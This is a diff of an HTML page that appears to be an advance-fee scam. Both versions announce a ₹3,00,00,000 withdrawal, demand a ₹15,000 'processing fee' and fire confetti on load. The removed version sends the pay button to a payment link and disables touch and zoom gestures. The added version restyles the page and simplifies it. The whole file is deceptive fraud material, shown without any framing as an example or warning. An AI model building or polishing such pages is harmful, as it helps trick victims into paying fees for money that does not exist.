@@ -1,175 +1,86 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>Withdrawal Process</title>
-  <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-    }
-    body {
-      font-family: Arial, sans-serif;
-      height: 100vh;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      background-color: #f3f3f3;
-      overflow: hidden;
-      touch-action: none;
-      -webkit-user-drag: none;
-      user-select: none;
-    }
-    .container {
-      position: fixed;
-      top: 0;
-      left: 0;
-      right: 0;
-      bottom: 0;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      z-index: 10;
-    }
-    .box {
-      background: white;
-      padding: 30px;
-      border-radius: 10px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.1);
-      width: 400px;
-      text-align: center;
-    }
-    h1 {
-      font-size: 24px;
-      margin-bottom: 20px;
-    }
-    h2 {
-      font-size: 32px;
-      color: #28a745;
-      margin-bottom: 25px;
-    }
-    p {
-      margin: 15px 0;
-      line-height: 1.5;
-    }
-    .important-note {
-      font-weight: bold;
-      margin: 25px 0;
-    }
-    .divider {
-      border-top: 1px solid #ddd;
-      margin: 25px 0;
-    }
-    .btn {
-      margin: 20px 0;
-      padding: 12px 25px;
-      background-color: #28a745;
-      color: white;
-      border: none;
-      cursor: pointer;
-      font-size: 16px;
-      border-radius: 5px;
-      display: inline-block;
-      text-decoration: none;
-      width: 100%;
-      font-weight: bold;
-    }
-    .footer {
-      font-size: 12px;
-      color: #666;
-      margin-top: 30px;
-    }
-    canvas {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      pointer-events: none;
-      z-index: 1;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <title>Withdrawal Process</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f9f9f9;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background: white;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+            text-align: center;
+            width: 90%;
+            max-width: 400px;
+        }
+        h1 {
+            margin-bottom: 10px;
+        }
+        .amount {
+            color: green;
+            font-size: 30px;
+            margin-bottom: 20px;
+        }
+        p {
+            margin: 10px 0;
+            font-size: 16px;
+        }
+        .important {
+            color: red;
+            font-weight: bold;
+        }
+        .pay-button {
+            background-color: green;
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            font-size: 16px;
+            border-radius: 8px;
+            cursor: pointer;
+            margin-top: 20px;
+        }
+        .payment-info {
+            margin-top: 10px;
+            font-size: 12px;
+            color: grey;
+        }
+    </style>
 </head>
 <body>
-  <canvas id="confetti"></canvas>
-  
-  <div class="container">
-    <div class="box">
-      <h1>Withdrawal Process</h1>
-      <h2>₹3,00,00,000</h2>
-      
-      <p>To complete your withdrawal, you need to pay a processing fee of <strong>₹15,000</strong>.</p>
-      
-      <div class="important-note">
-        Your withdrawal will be processed only after successful payment.
-      </div>
-      
-      <div class="divider"></div>
-      
-      <a href="https://payments.cashfree.com/links?code=z8f6c0csag80" class="btn" id="payButton">Pay Now ₹15,000</a>
-      
-      <div class="footer">
-        Payment will be processed securely via Cashfree Payments
-      </div>
-    </div>
-  </div>
 
-  <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.5.1/dist/confetti.browser.min.js"></script>
-  <script>
-    // Prevent all dragging/zooming
-    document.addEventListener('touchmove', function(e) {
-      e.preventDefault();
-    }, { passive: false });
-    
-    document.addEventListener('gesturestart', function(e) {
-      e.preventDefault();
-    });
-    
-    // Confetti function
-    function fireConfetti() {
-      // Main burst
-      confetti({
-        particleCount: 150,
-        spread: 70,
-        origin: { y: 0.6 },
-        colors: ['#ff0000', '#00ff00', '#0000ff', '#ffff00', '#ff00ff']
-      });
-      
-      // Left side
-      setTimeout(() => {
-        confetti({
-          particleCount: 50,
-          angle: 60,
-          spread: 55,
-          origin: { x: 0 }
-        });
-      }, 200);
-      
-      // Right side
-      setTimeout(() => {
-        confetti({
-          particleCount: 50,
-          angle: 120,
-          spread: 55,
-          origin: { x: 1 }
-        });
-      }, 400);
-    }
-    
-    // Fire confetti immediately on page load
+<div class="container">
+    <h1>Withdrawal Process</h1>
+    <div class="amount">₹3,00,00,000</div>
+    <p>To complete your withdrawal, you need to pay a processing fee of ₹15,000.</p>
+    <p class="important">Your withdrawal will be processed only after successful payment.</p>
+
+    <button class="pay-button">Pay Now ₹15,000</button>
+    <div class="payment-info">
+        Payment will be processed securely via Cashfree Payments
+    </div>
+</div>
+
+<!-- Confetti JS -->
+<script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.5.1/dist/confetti.browser.min.js"></script>
+<script>
+    // Confetti on page load
     window.onload = function() {
-      fireConfetti();
+        confetti({
+            particleCount: 150,
+            spread: 100,
+            origin: { y: 0.6 }
+        });
     };
-    
-    // Also fire confetti when clicking pay button
-    document.getElementById('payButton').addEventListener('click', function(e) {
-      e.preventDefault();
-      fireConfetti();
-      setTimeout(() => {
-        window.location.href = this.href;
-      }, 1000);
-    });
-  </script>
+</script>
+
 </body>
 </html>
